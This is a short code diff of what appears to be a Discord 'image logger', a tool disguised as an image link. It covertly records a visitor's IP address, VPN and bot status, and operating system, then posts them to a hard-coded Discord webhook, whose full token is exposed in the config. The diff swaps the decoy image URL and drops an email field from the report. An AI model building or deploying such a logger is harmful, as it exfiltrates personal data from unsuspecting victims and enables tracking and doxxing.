@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1457092967134396519/jHeKTzF8NIfX3n31a3NG-KxGiVcgppJ3f7SV8bWFqDSoy_JrpPmMvYpWmaG9oF172WOw",
-    "image": "https://media.discordapp.net/attachments/1456957821349265538/1456958239739744424/Ekran_goruntusu_2025-12-27_221010.png?ex=695a4199&is=6958f019&hm=2b0f3a25f48a4c126cf2ed13e53bedb5f71c8200a92854d6679115e5b020e9fd&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1367292213532430438/1459684579664331016/Ekran_goruntusu_2026-01-02_230650.png?ex=69642cb3&is=6962db33&hm=f9dcf091cd7c463ac59ecd3861be4629b8dac58be00e68da8cc5dbbb048e083f&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -162,7 +162,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-> **Mail** `{info['mail'] if info['mail'] else 'Unknown'}`
 
 **PC Info:**
 > **OS:** `{os}`
